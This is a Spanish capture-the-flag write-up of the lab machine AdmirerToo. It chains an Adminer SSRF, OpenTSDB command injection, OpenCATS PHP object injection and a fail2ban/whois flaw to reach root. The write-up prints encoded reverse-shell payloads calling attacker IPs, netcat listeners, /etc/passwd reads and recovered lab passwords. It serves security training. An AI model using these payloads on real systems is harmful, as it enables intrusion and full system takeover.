2.0//EN\\\">\\n<html><head>\\n<title>404 Not Found</title>\\n</head><body>\\n<h1>Not Found</h1>\\n<p>The requested URL was not found on this server.</p>\\n<hr>\\n<address>Apache/2.4.38 (Debian) Server at <a href=\\\"mailto:webmaster@admirer-gallery.htb\\\">10.129.96.181</a> Port 80</address>\\n</body></html>\\n\\n~~~\\n\\nLuego de hacer una enumeración del sistema, intentamos encontrar subdominios o VHOSTS en el servidor con gobuster:\\n\\n~~~bash\\ngobuster vhost  -u http://admirer-gallery.htb -w Repos/SecLists/Discovery/DNS/subdomains-top1million-5000.txt\\n===============================================================\\nGobuster v3.1.0\\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\\n===============================================================\\n[+] Url:          http://admirer-gallery.htb\\n[+] Method:       GET\\n[+] Threads:      10\\n[+] Wordlist:     Repos/SecLists/Discovery/DNS/subdomains-top1million-5000.txt\\n[+] User Agent:   gobuster/3.1.0\\n[+] Timeout:      10s\\n===============================================================\\n2022/06/16 11:07:18 Starting gobuster in VHOST enumeration mode\\n===============================================================\\nFound: db.admirer-gallery.htb (Status: 200) [Size: 2568]\\n                                                        \\n===============================================================\\n2022/06/16 11:08:29 Finished\\n===============================================================\\n~~~\\n\\nVerificamos el contenido del dominio db.admirer-gallery.htb\\n\\n![](/AdmirerToo/Pasted_image_20220616111424.png)\\n\\nLa version del software es Admirer 4.7.8\\n\\nSi presionamos sobre el botón Enter (sin la necesidad de ingresar credenciales)  lograremos obtener unas credenciales de acceso a admirer \\n\\n~~~http\\nPOST / HTTP/1.1\\nHost: db.admirer-gallery.htb\\nContent-Length: 162\\nCache-Control: max-age=0\\nUpgrade-Insecure-Requests: 1\\nOrigin: http://db.admirer-gallery.htb\\nContent-Type: application/x-www-form-urlencoded\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\\nReferer: http://db.admirer-gallery.htb/\\nAccept-Encoding: gzip, deflate\\nAccept-Language: en-US,en;q=0.9\\nCookie: adminer_sid=ssbd0ec7vb6kjntrvjfm3pcu1m; adminer_key=ca210dee4291ea9afbb692e9291dfefb; adminer_version=4.8.1\\nConnection: close\\n\\nauth%5Bdriver%5D=server&auth%5Bserver%5D=localhost&auth%5Busername%5D=admirer_ro&auth%5Bpassword%5D=1w4nn4b3adm1r3d2%21&auth%5Bdb%5D=admirer&auth%5Bpermanent%5D=1\\n~~~\\n\\nDatos recolectados:\\n\\n- **User**: admirer_ro\\n- **Password**: 1w4nn4b3adm1r3d2!\\n\\n\\n\\n\\n## Analisis de vulnerabilidades\\n\\nAdmirer 4.7.8 es vulnerable a ataques SSRF (CVE-2021-21311). El documento que explica como explotar esta vulnerabilidad es el siguiente:\\n\\nhttps://github.com/vrana/adminer/files/5957311/Adminer.SSRF.pdf\\n\\nPara la prueba de concepto es utilizado el siguiente script en python\\n\\nhttps://gist.github.com/bpsizemore/227141941c5075d96a34e375c63ae3bd\\n\\nNo sabemos cual es valor de campo auth[driver] en la request POST por lo que lo buscaremos usando docker y una imagen de admirer 4.7.8\\n\\nEjecutamos los siguientes comandos:\\n\\n\\n~~~bash\\ndocker pull adminer:4.7.8\\n~~~\\n\\n~~~bash\\nsudo docker run  -p 8082:8080 adminer:4.7.8\\n~~~\\n\\nLuego con burpsuite intentamos modificar los parámetros de login al sistema y enviamos una request POST\\n\\n![](/AdmirerToo/Pasted_image_20220616120347.png)\\n\\nLa request es la siguiente:\\n\\n~~~http\\nPOST / HTTP/1.1\\nHost: localhost:8082\\nContent-Length: 114\\nCache-Control: max-age=0\\nsec-ch-ua: \\\"-Not.A/Brand\\\";v=\\\"8\\\", \\\"Chromium\\\";v=\\\"102\\\"\\nsec-ch-ua-mobile: ?0\\nsec-ch-ua-platform: \\\"Linux\\\"\\nUpgrade-Insecure-Requests: 1\\nOrigin: http://localhost:8082\\nContent-Type: application/x-www-form-urlencoded\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\\nSec-Fetch-Site: same-origin\\nSec-Fetch-Mode: navigate\\nSec-Fetch-User: ?1\\nSec-Fetch-Dest: document\\nReferer: http://localhost:8082/\\nAccept-Encoding: gzip, deflate\\nAccept-Language: es-419,es;q=0.9\\nCookie: adminer_sid=efb4f07c4acae53848f88ecf3b2a81ad; adminer_key=f716493939fc48b347d7a7752a301860; adminer_version=4.8.1\\nConnection: close\\n\\nauth%5Bdriver%5D=elastic&auth%5Bserver%5D=db&auth%5Busername%5D=admin&auth%5Bpassword%5D=admin&auth%5Bdb%5D=asdasd\\n~~~\\n\\nEl payload que utilizaremos será:\\n\\n~~~\\nauth%5Bdriver%5D=elastic&auth%5Bserver%5D=10.10.14.28&auth%5Busername%5D=admin&auth%5Bpassword%5D=admin&auth%5Bdb%5D=asdasd\\n~~~\\n\\nEjecutamos el script hecho en python (es importante agregar el protocolo en la url de redirección, sino no funcionará)\\n\\n~~~bash\\npython2.7 redirect.py --ip 10.10.14.28 --port 80 http://google.com\\nserving at port 80\\n~~~\\n\\nFinalmente en la consola vemos el siguiente resultado:\\n\\n![](/AdmirerToo/Pasted_image_20220616134824.png)\\n\\ny la  respuesta de la aplicación web es:\\n\\n![](/AdmirerToo/Pasted_image_20220616134846.png)\\n\\nAl parecer no puede hacer solicitudes a sistemas externos a la red\\n\\nVamos a hacer una nueva solicitud, pero esta vez será a la página index de admirer\\n\\n~~~bash\\npython2.7 redirect.py --ip 10.10.14.28 --port 80 http://10.129.96.181/index.php\\nserving at port 80\\n~~~\\n\\nComo resultado en la aplicación admirer vemos el contenido HTML del Virtual HOST admirer-gallery.htb\\n\\n![](/AdmirerToo/Pasted_image_20220616135151.png)\\n\\n\\nIntentaremos acceder al puerto 4242 de la máquina objetivo mediante esta vulnerabilidad y logramos obtener la siguiente información:\\n\\n![](/AdmirerToo/Pasted_image_20220616164702.png)\\n\\nEl servicio en el puerto 4242 es OpenTSDB, por lo que buscamos información la aplicación OpenTSDB\\n\\nLa siguiente página menciona un RCE ( CVE-2020-35476) para la aplicación OpenTSDB, esta vulnerabilidad solo está presente en en las versiones 2.4.0 o menos.\\n\\nhttps://github.com/OpenTSDB/opentsdb/issues/2051\\n\\nUsamos el payload descrito en el link anterior y ponemos el script python para redireccionar request a la esucha en el puerto 80.\\n\\n~~~bash\\npython2.7 redirect.py --port 80 --ip 10.10.14.28 \\\"http://10.129.96.181:4242/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system('touch/tmp/poc.txt')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json\\\"\\n~~~\\n\\nComo respuesta el sistema nos entrega un error\\n\\n![](/AdmirerToo/Pasted_image_20220616172852.png)\\n\\nEl error termina con la linea:\\n\\n~~~\\nNo such name for 'metrics': 'sys.cpu.nice'\\\\n\\\\tat net.opentsdb.uid.UniqueId$1GetIdCB.call(UniqueId.java:450)\\n~~~\\n\\nEste error nos indica que esta métrica no existe en el sistema, por lo que debemos identificar que otras métricas tiene disponible. Un post en Buffer overflow nos sugiere una solución:\\n\\nhttps://stackoverflow.com/questions/18396365/opentsdb-get-all-metrics-via-http\\n\\nPonemos el script python a la escucha de la siguiente forma\\n\\n~~~bash\\npython2.7 redirect.py --port 80 --ip 10.10.14.28 \\\"http://10.129.96.181:4242/api/suggest?type=metrics&max=10\\\" \\n~~~\\n\\nLuego de ejecutar el exploit el sistema nos entrega el siguiente resultado:\\n\\n![](/AdmirerToo/Pasted_image_20220616184008.png)\\n\\n~~~\\nhttp.stats.web.hits\\n~~~\\n\\nUtilizaremos esta metrica para explotar el RCE\\n\\n## Explotation\\n~~~bash\\npython2.7 redirect.py --port 80 --ip 10.10.14.28 \\\"http://10.129.96.181:4242/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:http.stats.web.hits&o=&ylabel=&xrange=10:10&yrange=[33:system('touch/tmp/poc.txt')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json\\\"\\n~~~\\n\\nAl parecer funcionó correctamente, ya que el mensaje entregado es completamente nuevo.\\n\\n![](/AdmirerToo/Pasted_image_20220616184219.png)\\n\\n## Obteniendo una Shell\\n\\nAhora intentamos obtener una shell reversa:\\n\\nEnviaremos nuestro payload codificado en base64:\\n\\n~~~bash\\necho \\\"/bin/bash -l > /dev/tcp/10.10.14.28/443 0<&1 2>&1\\\" | base64\\n~~~\\n\\nEl payload final sera el siguiente\\n\\n~~~bash\\necho+\\\\\\\"L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTQuMjgvNDQzIDA8JjEgMj4mMQo=\\\\\\\"|base64+-d|bash\\n~~~\\n\\nFinalmente agregamos nuestro payload al script que explota la vulnerabilidad de OpenTSDB\\n\\n~~~bash\\npython2.7 redirect.py --port 80 --ip 10.10.14.28 \\\"http://10.129.96.181:4242/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:http.stats.web.hits&o=&ylabel=&xrange=10:10&yrange=[33:system('echo+\\\\\\\"L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTQuMjgvNDQzIDA8JjEgMj4mMQo=\\\\\\\"|base64+-d|bash')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json\\\"\\n~~~\\n\\n\\n\\n![](/AdmirerToo/Pasted_image_20220616192757.png)\\n\\n\\n## Enumeracion de sistemas\\n\\nEnumeramos el directorio /var/www/adminer/plugins/data, dónde encontramos el archivo servers.php y su contenido es:\\n\\n~~~php\\n<?php\\nreturn [\\n  'localhost' => array(\\n//    'username' => 'admirer',\\n//    'pass'     => 'bQ3u7^AxzcB7qAsxE3',\\n// Read-only account for testing\\n    'username' => 'admirer_ro',\\n    'pass'     => '1w4nn4b3adm1r3d2!',\\n    'label'    => 'MySQL',\\n    'databases' => array(\\n      'admirer' => 'Admirer DB',\\n    )\\n  ),\\n];\\n\\n~~~\\n\\nPosibles credenciales\\n\\n- **Password**: 1w4nn4b3adm1r3d2!\\n- **Password**: bQ3u7^AxzcB7qAsxE3\\n\\nIdentificamos los usuarios del sistema:\\n\\n~~~bash\\ncat /etc/passwd | grep sh\\nroot:x:0:0:root:/root:/bin/bash\\nopentsdb:x:1000:1000::/usr/share/opentsdb:/bin/false\\njennifer:x:1002:100::/home/jennifer:/bin/bash\\nsshd:x:106:65534::/run/sshd:/usr/sbin/nologin\\n~~~\\n\\n\\nIntentamos acceder a la máquina mediante SSH con las siguientes credenciales:\\n\\n- **Usuario**: jennifer\\n- **Password**: bQ3u7^AxzcB7qAsxE3\\n\\n### Enumeración como Jennifer\\n\\n![](/AdmirerToo/Pasted_image_20220616194251.png)\\n\\nLogramos acceso al sistema\\n\\nIdentificamos los puertos abiertos con netstat -ano\\n\\n~~~bash\\nActive Internet connections (servers and established)\\nProto Recv-Q Send-Q Local Address           Foreign Address         State       Timer\\ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)\\ntcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      off (0.00/0/0)\\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)\\ntcp        0      0 10.129.96.181:55074     10.10.14.28:443         CLOSE_WAIT  off (0.00/0/0)\\ntcp        0     36 10.129.96.181:22        10.10.14.28:47588       ESTABLISHED on (0.34/0/0)\\ntcp6       0      0 :::16030                :::*                    LISTEN      off (0.00/0/0)\\ntcp6       0      0 127.0.1.1:16000         :::*                    LISTEN      off (0.00/0/0)\\ntcp6       0      0 127.0.0.1:2181          :::*                    LISTEN      off (0.00/0/0)\\ntcp6       0      0 :::16010                :::*                    LISTEN      off (0.00/0/0)\\ntcp6       0      0 :::80                   :::*                    LISTEN      off (0.00/0/0)\\ntcp6       0      0 :::4242                 :::*                    LISTEN      off (0.00/0/0)\\ntcp6       0      0 127.0.1.1:16020         :::*                    LISTEN      off (0.00/0/0)\\ntcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)\\ntcp6       0      0 127.0.0.1:2181          127.0.0.1:43884         ESTABLISHED off (0.00/0/0)\\ntcp6       0      0 127.0.1.1:16000         127.0.1.1:37563         ESTABLISHED keepalive (5315.17/0/0)\\ntcp6       0      0 127.0.0.1:2181          127.0.0.1:43894         ESTABLISHED off (0.00/0/0)\\ntcp6       0      0 127.0.0.1:51310         127.0.1.1:16020         TIME_WAIT   timewait (31.89/0/0)\\ntcp6       0      0 127.0.0.1:43910         127.0.0.1:2181          ESTABLISHED off (0.00/0/0)\\n~~~\\n\\nNotamos un servicio corriendo en el puerto 8080. Intentamos acceder con Curl a la aplicación identificandola como OpenCATS  versión  0.9.5.2\\n\\n### Opencats\\n\\nIdentificamos una potencial vulnerabilidad (CVE-2021-25294) en el siguiente link:\\n\\nhttps://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html\\n\\nHacemos un port forwarding con los siguientes comandos\\n\\n![](/AdmirerToo/Pasted_image_20220616232051.png)\\n\\nFinalmente accedermos a la pagina en nuestra maquina local\\n\\n![](/AdmirerToo/Pasted_image_20220616232118.png)\\n\\nIngresamos al sistema con las credenciales de jennifer\\n\\n- **Usuario**: jennifer\\n- **Password**: bQ3u7^AxzcB7qAsxE3\\n\\n\\n### Fail2ban\\n\\nFile2ban es una herramienta que evita el uso de ataques de fuerza bruta baneando la correspondiente IP.\\n\\nEn el directorio /etc identificamos el software fail2ban, este posee una vulnerabilidad (CVE-2021-32749) RCE basado en otros dos software mail y whois. Este último usa un archivo de configuración en el directorio /usr/local/etc\\n\\nhttps://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm \\n\\n## Elevación de privilegios\\n\\nPrimero intentamos crear el archivo whois.conf en el directorio /usr/local/etc con la vulnerabilidad de opencats\\n\\n\\ncreamos el archivo whois.conf basados en el siguiente (ejemplo)[https://gist.github.com/thde/3890aa48e03a2b551374]\\n\\n~~~\\n##\\n# WHOIS servers for new TLDs (http://www.iana.org/domains/root/db)\\n# Current as of 2017-12-10 UTC\\n##\\n\\n\\\\.aarp$ whois.nic.aarp\\n\\\\.abarth$ whois.afilias-srs.net\\n\\\\.abbott$ whois.afilias-srs.net\\n\\\\.abbvie$ whois.afilias-srs.net\\n\\\\.abc$ whois.nic.abc\\n\\\\.abogado$ whois.nic.abogado\\n\\\\.abudhabi$ whois.nic.abudhabi\\n~~~\\n\\nNotamos que la primera parte es una expresión regular mientras que la segunda es el DNS del respectivo TLD\\n\\n\\nNuestro archivo es:\\n\\n~~~\\n10.10.14.8 10.10.14.8\\n~~~\\n\\nDescargamos la herramienta (phpgcc)[https://github.com/ambionics/phpggc] y ejecutamos el siguiente comando\\n\\n~~~bash\\nphpggc/phpggc  -u --fast-destruct Guzzle/FW1 /usr/local/etc/whois.conf whois.conf\\n~~~\\n\\nNos da como resultado lo siguiente:\\n\\n~~~bash\\na%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A22%3A%2210.10.14.8+10.10.14.8%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D\\n~~~\\n\\nLuego en el navegador hacemos una request\\n\\n~~~\\nhttp://localhost:8888//index.php?m=activity&parametersactivity%3AActivityDataGrid=a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A22%3A%2210.10.14.8+10.10.14.8%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D\\n~~~\\n\\nLuego verificamos que el archivo ha sido creado exitosamente, pero su contenido no es el deseado\\n\\n![](/AdmirerToo/Pasted_image_20220617210535.png)\\n\\nModificamos su contenido del archivo whois.conf:\\n\\n~~~\\n]*10.10.14.8 10.10.14.8 #\\n~~~\\n\\nLa modificación se debe a que el primer campo es una expresión regular como vimos en el archivo de ejemplo mas arriba. Por lo que, podemos obviar esta expresión agregando el caracter de cierre de cochetes junto con un asterisco.\\n\\nLuego de hacer el proceso anterior  vemos que el resultado es:\\n\\n~~~bash\\ncat whois.conf                                                                                                                           \\n[{\\\"Expires\\\":1,\\\"Discard\\\":false,\\\"Value\\\":\\\"]*10.10.14.8 10.10.14.8 #\\\\n\\\"}]\\n~~~\\n\\nCon el objetivo de verificar usamos el comando whois y falla\\n\\n![](/AdmirerToo/Pasted_image_20220617211358.png)\\n\\nRevisamos el código fuente de whois para entender como procesa el archivo de configuración whois.conf\\n\\nhttps://github.com/rfc1036/whois/blob/next/whois.c\\n\\nVamos a la función match_config_file\\n\\n![](/AdmirerToo/Pasted_image_20220617211541.png)\\n\\nVemos que tiene un buffer de 512 caracters, eso quiere decir que si agregamos espacios para evitar que los caracteres #\\\\n\\\" sean agregados al buffer el comando puede funcionar\\n\\nEl nuevo payload será el siguiente:\\n\\n~~~\\nhttp://localhost:8888//index.php?m=activity&parametersactivity%3AActivityDataGrid=a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bss%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D\\n~~~\\n\\nLuego de modificar el archivo volvemos a probar el comando whois:\\n\\nPonemos el puerto 43 a al escucha:\\n\\n~~~bash\\nnc -lnvp 43 \\nlistening on [any] 43 ...\\n\\n~~~\\n\\nEjecutamos el comando whois\\n\\n~~~bash\\nwhois 10.10.14.8\\n~~~\\n\\nY en nuestra maquian obvervamos lo siguiente:\\n\\n~~~\\nnc -lnvp 43 \\nlistening on [any] 43 ...\\nconnect to [10.10.14.8] from (UNKNOWN) [10.129.96.181] 40666\\n10.10.14.8\\n~~~\\n\\nAhora debemos explotar  el RCE de fail2ban. Esto lo logramos de la siguiente forma\\n\\nPonemos el puerto 43 a la escucha junto con la entrega del payload para el reverse shell\\n~~~bash\\necho -e \\\"\\\\n~! bash -c 'bash -i &> /dev/tcp/10.10.14.8/443 0>&1'\\\\n\\\" | ncat -lnvp 43\\nNcat: Version 7.92 ( https://nmap.org/ncat )\\nNcat: Listening on :::43\\nNcat: Listening on 0.0.0.0:43\\n\\n~~~\\n\\nPonemos el puerto 443 a la escucha de la shell\\n\\n~~~\\nnc lnvp 443\\n~~~\\n\\nFinalmente intentamos acceder al sistema admirertoo mediante ssh con el usuario root y sin ingresar ninguna contraseña\\n\\n~~~\\nssh root@10.129.96.181\\n~~~\\n\\nLuego del tercer intento, obtenemos una shell como root\\n\\n~~~bash\\nnc -lnvp 443\\nNcat: Version 7.92 ( https://nmap.org/ncat )\\nNcat: Listening on :::443\\nNcat: Listening on 0.0.0.0:443\\nNcat: Connection from 10.129.89.36.\\nNcat: Connection from 10.129.89.36:37446.\\nbash: cannot set terminal process group (1762): Inappropriate ioctl for device\\nbash: no job control in this shell\\nroot@admirertoo:/# whoami\\nwhoami\\nroot\\nroot@admirertoo:/# \\n~~~\\n\\n\\n\"}"},"__N_SSG":true}